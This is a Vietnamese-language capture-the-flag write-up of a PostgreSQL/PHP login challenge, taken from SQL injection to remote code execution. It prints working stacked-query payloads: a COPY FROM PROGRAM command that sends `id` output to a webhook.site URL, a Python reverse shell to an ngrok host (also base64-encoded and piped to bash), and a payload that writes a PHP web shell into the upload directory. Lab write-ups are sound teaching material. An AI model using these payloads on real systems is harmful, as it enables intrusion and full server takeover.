---
title: "[WRITEUP] Baby SQL Injection to RCE - COOKIE ARENA"
categories:
- CTF Writeup
- Cookie Arena
tags:
- SQLi
date: '2024-07-10 14:30:00'
---

## Intro
Link Challenge: [here](https://battle.cookiearena.org/challenges/web/baby-sql-injection-to-rce){:target="\_blank"}

Mô tả: 
```
This is because traditional SQL injection techniques. Could you execute command?

The challenge is running in PostgreSQL and PHP.

Flag File: /flagXXXX.txt
Flag Format: CHH{XXX}
```
## Exploit
Mới đầu vào xuất hiện 1 trang login:

![Login Page](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/1.png)

Source code:
```php
<?php
  include_once('./ignore/design/design.php');
  $design = Design(__FILE__, 'Basic Web');

  include('config.php');
  $message = "";
  
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
      $username = trim($_POST['username']);
      $password = trim($_POST['password']);
  
      // Truy vấn kiểm tra tên người dùng và mật khẩu
      $sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
      $result = pg_query($conn, $sql) or die(pg_last_error());

      if (pg_num_rows($result) > 0) {
        $message = "Welcome, $username!";
      } else {
        $message = "Invalid username or password!";
      }
  }
?>
<html>
  <head>
    <title>Basic Login</title>
  </head>
  <body>
    <?php if(strlen($message) > 0) { echo $message; } else { ?>
    <div>
        <h2>Login</h2>
        <form action="/index.php" method="post">
          
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" class="form-control" id="username" name="username">
            </div>
            <div class="form-group">
                <label for="pwd">Password:</label>
                <input type="password" class="form-control" id="pwd" name="password">
            </div>
            <button type="submit" class="btn btn-primary">Login</button>
        </form>
    </div>
    <?php } ?>

    <div>
      <?php echo $design; ?>  
    </div>    
  </body>
</html>
```

Trước hết, đọc source code ta thấy được câu truy vấn `$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";`, ngỡ là ta được trở lại những năm 2000 :)). Trigger sqli và nảy sang 1 trang welcome.

![Welcome](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/2.png)

Như cái tiêu đề và mô tả, chúng ta phải khai thác SQL injection to RCE vì flag nằm trong file hệ thống chứ không nằm trong db. 2 ý tưởng nảy trong đầu của tui:
1. Liệu có câu lệnh sql của PostgreSQL nào giúp ta thực thi os command hay không?
2. Liệu có thư mục nào mà ta có quyền ghi file? Từ đó up webshell bằng SQL?

Nhưng, trong câu truy vấn gốc với mệnh đề select thì ta không làm được gì nhiều. Vậy liệu còn cách nào khác giúp ta có thể chạy nguyên vẹn 1 sql command để có thể làm được nhiều thứ hơn? Có một khái niệm cho phép ta làm điều này [Stack Queries](https://cookiearena.org/penetration-testing/stacked-query-trong-sql-injection/){:target="\_blank"}.

![Stack Queries](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/3.png)

Vậy là confirm rằng psql có support Stacked Queries.

### Vector 1: Execute OS command via SQL
Sau một hồi research docs của postgresql, tui tìm được [cái này](https://www.postgresql.org/docs/current/sql-copy.html#:~:text=the%20path%20name.-,PROGRAM,string%2C%20or%20at%20least%20avoid%20including%20any%20user%20input%20in%20it.,-STDIN){:target="\_blank"}.
 
 `COPY FROM PROGRAM` giúp ta thực hiện vector 1 mà tui đưa ra. 

- Bắt đầu với việc tạo 1 table.
```text
';CREATE TABLE shell(output text);-- -
```

![Create Table](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/4.png)

- Sử dụng PROGRAM để thiết lập command. Test payload:
```text
'; COPY shell FROM PROGRAM 'curl https://webhook.site/de60c29f-ebc7-4f64-8851-09f08950387e/res=`id`';-- -
```

![Test exec command](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/5.png)

Sure là payload của ta hoạt động. RCE thoaii

![RCE](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/6.png)

Giải thích một chút payload:
- Đầu tiên, biết server đang chạy python3, nên tui dùng payload reverse shell này:
```
export RHOST="0.tcp.ap.ngrok.io";export RPORT=19890;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

- Tiếp đến, để vận chuyển payload 1 cách mượt mà, tui base64 lại và dùng pipeline để xử lý payload. Full payload nè:
```
'; COPY shell FROM PROGRAM 'echo "ZXhwb3J0IFJIT1NUPSIwLnRjcC5hcC5uZ3Jvay5pbyI7ZXhwb3J0IFJQT1JUPTE5ODkwO3B5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oInNoIikn" | base64 -d | /bin/bash';-- -
```

### Vector 2: Upload shell via SQL

- Thứ nhất, điều kiện tiên quyết là upload ở đâu đó trong document-root để có thể thực thi file php? 
- Và thư mục đó có quyền ghi cho user postgres hay không?

Thực hiện dirsearch endpoint của website thì phát hiện ra 1 số thứ hay ho:

![dirsearch](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/7.png)

Trang phpinfo cho ta biết được một số thông tin quan trọng như document_root. 

![phpinfo](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/8.png)

Thư mục upload

![upload](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/9.png)


Thư mục upload/ và document_root là 2 keys chính cho giả thiết 2 này. 

Việc còn lại là craft 1 payload để ghi file, cụ thể hơn là file php (để chứng minh thư mục file php có được thực thi hay không).

```
'; CREATE TEMPORARY TABLE temp_results(a VARCHAR(255)); INSERT INTO temp_results (a) VALUES ('<?php phpinfo(); ?>'); COPY temp_results TO '/www/upload/1.php' WITH (FORMAT CSV);-- -
```

![test payload](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/10.png)

Giải thích payload:
- Tạo 1 bảng tạm có 1 column để chèn payload.
- `COPY temp_results TO '/www/upload/1.php' WITH (FORMAT CSV);` câu lệnh giúp xuất toàn bộ content của table `temp_results` chứa payload vào 1 file trong hệ thống với absolute path (nếu cố tình chèn relative path sẽ gây ra lỗi) (đó cũng chứng minh rằng document_root là thông tin cần thiết cho vector này).

Thay payload phpinfo() bằng `<?php system($_GET[cmd]); ?>');` => RCE

![RCE](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/11.png)